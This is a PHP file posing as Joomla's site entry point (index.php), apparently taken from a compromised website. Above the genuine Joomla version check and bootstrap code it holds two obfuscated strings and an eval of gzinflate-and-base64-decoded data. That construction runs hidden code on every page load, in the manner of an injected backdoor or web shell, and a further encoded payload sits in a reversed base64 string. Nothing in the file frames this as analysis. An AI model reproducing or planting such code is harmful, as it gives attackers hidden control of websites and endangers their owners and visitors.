<?php
$Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9dKrSvOS83MLilKLizXQOJl5\x61TmJJ\x61lYWUmJx\x61lmJvEpq\x63n5K\x61k\x61xSVFR\x61llGio\x2bmRWaUGAN\x41\x41\x3d\x3d";
$Lix = "==Aq74u9rxrw5aw/8678le1P/jy2mIeGXECy3wv6uUQ25MPIbopUcAcORENwkBcZsQnZxFjwlTTlGnb4iPyoTWeAhbudRBzBvthOKeR6EPaMQ1ZNJb3IFXot+jHDX3++WnAxamQZ9H2TbFPyUj5Fj0TO8OYQb8QYq2GPyO6seu6njimksSZv3bN3fUcrtqlol3Ig8e2f5xJuqrk3ao4ElAp0eWCPKV1/xIfIqqAM5yMDgIjOzZVhkzt0gnjZSVG6DxqumajSTt2YuvZ8O/sVQ4bUz3Vwq/3bqhxwDatAqT8x4T+abU1wqS2FSOMYQIy4iI/pQ2gO0FN0WeVp9A+RmIgMFNyVJb7JVNKAOEAnyzdObZctzJQlZK1XlrAgnTZlLJjFiSnEvrfaG0hVIFmITH6owkuxsZIcCJcpQhRYMZheqwJMo+tFcATzy0KbnBhj0liNUWTP2McbAZXFD3l1/Gfu31wfUA+2ZbM3FwlNdPs3E7bieKyPxrbsn0v1qfPfARPxJ9mXdXCEmFP9xl/eKsM+ZbuE0nvXie/G5yfTFn8LRrOdpPi73eVJ9pw/5Bel6iA202ygLtMxcx/n84qE+7ocCzGDQKV5YGSaHsmui30IXktDSSsYOiyij+oD2OwGHKSnDl9KPijH6Gy+ke7w5aD4BvMnfooP4L6nm8BBTdpM2yqYtVSBHCCLCYLEzQ3nAdWdOo33uaAarIypSvHKYsMpa+MV3nb7CojB1Aui9rXsouev7c6dn3r72ijDlZ/620e+Z/9fsDrsyjUSco9O5UEGlaQ7vYh1CddchuALQG29NpN0bLlmg+P2+0PEws9avTVvciX/QKwbBwJe9XoA6FQ/AKwfB0/eCQYA";
eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
/**
 * @package     Joomla.Site
 * @copyright   (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
 * @license     GNU General Public License version 2 or later; see LICENSE.txt
 */

// NOTE: This file should remain compatible with PHP 5.2 to allow us to run our PHP minimum check 
// and show a friendly error message.

// Define the application's minimum supported PHP version as a constant so it can be referenced within the application.
define('JOOMLA_MINIMUM_PHP', '7.2.5');

// Check if the current PHP version is less than the minimum required version
if (version_compare(PHP_VERSION, JOOMLA_MINIMUM_PHP, '<')) {
    die(
        str_replace(
            '{{phpversion}}', 
            JOOMLA_MINIMUM_PHP, 
            file_get_contents(dirname(__FILE__) . '/templates/system/incompatible.html')
        )
    );
}

/**
 * Constant that is checked in included files to prevent direct access.
 * define() is used rather than "const" to avoid errors for PHP 5.2 and lower.
 */
define('_JEXEC', 1);

// Run the application - All executable code should be triggered through this file
require_once dirname(__FILE__) . '/includes/joomla.php';
?>
